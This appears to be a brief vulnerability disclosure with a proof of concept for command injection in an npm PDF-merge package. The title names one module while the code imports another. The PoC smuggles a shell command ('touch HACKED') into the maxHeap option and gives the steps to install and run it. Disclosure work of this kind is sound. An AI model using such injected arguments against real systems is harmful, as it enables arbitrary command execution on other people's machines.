# Description

The `pdf-toolz` module is vulnerable against `arbitrary command injection` due to the fact some `inputs` given by the `user` are unsafely processed and executed.

# POC

1. Create the following PoC file:

```js
// poc.js
const merge = require('easy-pdf-merge');

merge(["test", "test1"], "test2", {maxHeap:"test; touch HACKED; #"}, function(err){
  if(err) {
    return console.log(err)
  }
  console.log('Success')
});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i easy-pdf-merge # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
